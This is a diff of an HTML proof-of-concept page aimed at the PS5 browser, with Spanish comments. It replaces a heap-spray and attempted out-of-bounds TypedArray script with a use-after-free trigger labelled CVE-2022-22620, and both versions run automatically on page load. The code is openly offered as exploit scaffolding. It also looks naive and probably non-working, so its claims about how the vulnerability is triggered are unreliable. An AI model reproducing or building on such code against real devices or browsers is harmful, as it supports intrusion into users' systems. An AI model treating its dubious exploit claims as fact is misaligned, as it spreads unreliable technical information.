@@ -1,106 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>💥 PS5 Exploit PoC: Heap + TypedArray</title>
+  <meta charset="utf-8">
+  <title>💥 PS5 PoC - CVE-2022-22620</title>
   <style>
-    body {
-      background: black;
-      color: lime;
-      font-family: monospace;
-      white-space: pre-wrap;
-      padding: 1em;
-    }
+    body { background: black; color: lime; font-family: monospace; padding: 1em; white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <h1>💥 PS5 Exploit PoC: Heap + TypedArray</h1>
+  <h1>💥 CVE-2022-22620 PoC (Use-After-Free)</h1>
   <pre id="log">[LOG]\n</pre>
 
-  <script>
-    const logElem = document.getElementById("log");
-    function print(msg) {
-      console.log(msg);
-      logElem.textContent += msg + "\n";
+<script>
+  const log = document.getElementById("log");
+  function print(msg) {
+    log.textContent += msg + "\n";
+    console.log(msg);
+  }
+
+  function triggerUAF() {
+    print("[*] Iniciando trigger CVE-2022-22620...");
+
+    let iframe = document.createElement('iframe');
+    document.body.appendChild(iframe);
+
+    iframe.contentDocument.open();
+    iframe.contentDocument.write("<body><div id='target'>Hello</div></body>");
+    iframe.contentDocument.close();
+
+    // Creamos un range sobre el iframe
+    let range = iframe.contentDocument.createRange();
+    let target = iframe.contentDocument.getElementById('target');
+
+    range.selectNodeContents(target);
+
+    // Removemos el iframe → libera target y range internamente
+    document.body.removeChild(iframe);
+    print("[+] Iframe eliminado, objeto debería estar liberado");
+
+    // Forzamos reuso del objeto potencialmente liberado
+    try {
+      let text = range.toString();  // UAF ocurre aquí en versiones vulnerables
+      print("[+] range.toString() ejecutado: " + text);
+    } catch (e) {
+      print("[-] Error al acceder a range: " + e);
     }
 
-    // Conversión float64 <-> int64 usando ArrayBuffer
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
+    print("[*] Fin del trigger.");
+  }
 
-    function f2i(f) {
-      f64[0] = f;
-      return u32[0] + u32[1] * 0x100000000;
-    }
-
-    function i2f(i) {
-      u32[0] = i % 0x100000000;
-      u32[1] = Math.floor(i / 0x100000000);
-      return f64[0];
-    }
-
-    function hex(i) {
-      return '0x' + i.toString(16).padStart(16, '0');
-    }
-
-    function groomHeap() {
-      print("[1] Realizando heap spray...");
-      const spray = [];
-      for (let i = 0; i < 1000; i++) {
-        const arr = new Array(100).fill(13.37);
-        spray.push(arr);
-      }
-      print(`[+] Heap grooming completado con ${spray.length} arrays.`);
-      return spray;
-    }
-
-    function prepareTypedArrays() {
-      print("[2] Preparando TypedArrays...");
-      const ab = new ArrayBuffer(0x100);
-      const f64_view = new Float64Array(ab);
-      const u32_view = new Uint32Array(ab);
-
-      f64_view[0] = 13.37;
-      u32_view[2] = 0xdeadbeef;
-
-      print(`[+] f64_view[0] = ${f64_view[0]}`);
-      print(`[+] u32_view[2] (mismo buffer) = 0x${u32_view[2].toString(16)}`);
-    }
-
-    function attemptFakeOOB() {
-      print("[3] Intentando OOB en TypedArray...");
-
-      const target = new Float64Array(10);
-      const corruptor = [];
-
-      for (let i = 0; i < 10000; i++) {
-        corruptor.push([1.1, 2.2, 3.3]);
-      }
-
-      try {
-        // Intento de manipulación de propiedades internas (solo sirve si hay un bug real)
-        Object.defineProperty(target, 'length', { value: 0x1000 });
-        print("[+] Forzada longitud grande en Float64Array");
-
-        let val = target[0x200]; // lectura fuera de rango
-        print(`[+] target[0x200] = ${val}`);
-
-        target[0x200] = 42.4242;
-        print(`[+] Escritura OOB en target[0x200] completada`);
-
-        let check = target[0x200];
-        print(`[+] Verificado target[0x200] = ${check}`);
-      } catch (e) {
-        print("[-] Fallo durante intento OOB: " + e);
-      }
-    }
-
-    window.onload = () => {
-      groomHeap();
-      prepareTypedArrays();
-      attemptFakeOOB();
-    };
-  </script>
+  window.onload = () => {
+    setTimeout(triggerUAF, 100);
+  };
+</script>
 </body>
 </html>
